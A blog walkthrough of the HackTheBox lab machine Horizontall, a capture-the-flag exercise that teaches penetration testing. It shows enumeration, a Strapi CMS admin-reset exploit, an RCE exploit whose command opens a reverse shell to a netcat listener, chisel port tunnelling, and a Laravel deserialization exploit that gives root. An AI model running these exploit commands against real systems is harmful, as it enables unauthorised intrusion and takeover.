---
title: HTB Writeup - Horizontall
date: 2022-01-26T15:19:50.347Z
image: /images/1_jbwgsjvfciuozjdoclzcow.jpeg
tags:
  - hackthebox
  - htb
  - horizontall
  - tunneling
  - chisel
  - StrapiCMS
  - laravel
draft: false
---
**Machine Details**

**Name: Horizontall**

**IP address: 10.10.11.105**

**Difficulty: Easy**

**Points 20**

**Initial Enumeration**

Upon obtaining the IP address, 10.10.11.105, the first thing to do is to run a scan to figure out what ports and services are running on the machine. I did this using nmap and the result is shown below:

![](/images/2022-01-26_13-17.png)

The machine has two services running; SSH on port 22 and HTTP on port 80. The SSH version looks recent so I started my enumeration on the HTTP service running on port 80. From the result, the page redirects to http://horizontall.htb, so I proceeded to add this to my /etc/hosts file.

`10.10.11.105    horizontall.htb`

Visiting http://horizontall.htb in the browser, I was presented with the following page:

![](/images/2022-01-26_13-23.png)

I spent quite some time on this page trying to find a possible entry point but to no avail. I found that the web page using Vue.js. I ran a directory brute force using gobuster and obtained the following results:

`gobuster dir -u http://horizontall.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out`

![](/images/2022-01-26_13-27.png)

I also tried to run a directory search using various extensions but no positive result. Being on this stage for a while, I decided to run a full port scan on the address to see if other ports are running, but did not find any. Since I have an hostname, horizontall.htb, I decided to search for other subdomains on the hostname. For this purpose, I used wfuzz starting with the subdomains-top1million-5000.txt file from seclists, I did not obtain a result, I used the subdomains-top1million-20000.txt file, no result and finally I used the subdomains-top1million-110000.txt file and I found another subdomain.

`wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" -u http://horizontall.htb --hc 301 -v`

I added this newly founded subdomain to the /etc/hosts file.

`10.10.11.105    horizontall.htb ********.horizontall.htb`

Visiting this subdomain on the browser, I was presented with a page that says "Welcome.".

![](/images/2022-01-26_16-34.png)

I performed directory search on this new subdomain using gobuster and I obtained some results:

`gobuster dir -u http://********.horizontall.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.********.out`

![](/images/2022-01-26_14-07.png)

Visiting /admin on the browser, I was presented with a login page running Strapi CMS.

![](/images/2022-01-26_15-42_1.png)

I proceeded to searching Google for Strapi CMS and found that this CMS is vulnerable to a couple of remote code execution (RCE) vulnerabilities. One I found interesting is the unauthenticated exploit at <https://www.exploit-db.com/exploit/50239>. The exploit basically resets the admin password to a given value and provides a JWT token for the session. I downloaded and ran the exploit with the required parameter and was able to successfully reset the admin's password and obtain a JWT key and was able to login into the admin dashboard.

![](/images/2022-01-26_14-21.png)

`python3 50239.py http://********.horizontall.htb`

![](/images/2022-01-26_16-42.png)

![](/images/2022-01-26_15-42.png)

At this point, there are two options. The first is to send commands through the cmd shell obtained from the exploit above and wait for possible execution (blind RCE). The second option (which I followed) was to use another RCE exploit (authenticated) to gain a shell on the box. I found an exploit at <https://github.com/diego-tella/CVE-2019-19609-EXPLOIT>. The exploit takes a domain name or IP address, a JWT token, a listening host IP and a listening port. I ran the exploit and was able to obtain a reverse shell on my machine.

`python exploit.py -d http://********.horizontall.htb -jwt JWT -l 10.10.14.104 -p 9001`

Note: JWT is the token value obtained from 50239.py exploit. Also I had started a listener on my box on port 9001.

`nc -lvnp 9001`

![](/images/2022-01-26_14-54.png)

Now that I have a foothold, I started enumerating the box. I cat'ed the /etc/passwd file and noticed there is a user "developer". I visited the user's home directory and was able to read the user.txt file.

![](/images/2022-01-26_14-57.png)

After a while I went back to the directory I got a shell into, /opt/strapi/myapi and found a directory "config" that contains some environment configurations. In the development folder, I found mysql creds for the user "developer".

![](/images/2022-01-26_14-58.png)

I was able to access mysql with the creds but I obtained nothing much from the database. I tried to login on the box as user "developer" using the password I found but I got password authentication failure error.

After a while of enumeration, I checked the network connections using netstat and I noticed there is a service running on port 8000 locally on the box.

`netstat -antp`

![](/images/2022-01-26_14-59.png)

In order to access the service, I tunneled the port to my local machine on port 8080. I used chisel to do this (I had to move it to the box).

![](/images/2022-01-26_15-03.png)

 Accessing the port on my local machine, I got the page below:

![](/images/2022-01-26_15-03_1.png)

Searching for Laravel8 vulnerabilities on Google, I came across an interesting documentation on bookhacktricks - <https://book.hacktricks.xyz/pentesting/pentesting-web/laravel>. To verify, I checked that the Laravel setup is in debug mode.

![](/images/2022-01-26_15-04.png)

Down the page, there is link to a Laravel deserialization exploit. I used the exploit at <https://github.com/nth347/CVE-2021-3129_exploit>. Running the exploit with the required parameters, I was able to obtain a root shell on the box.

![](/images/2022-01-26_15-06.png)

And that's Horizontall!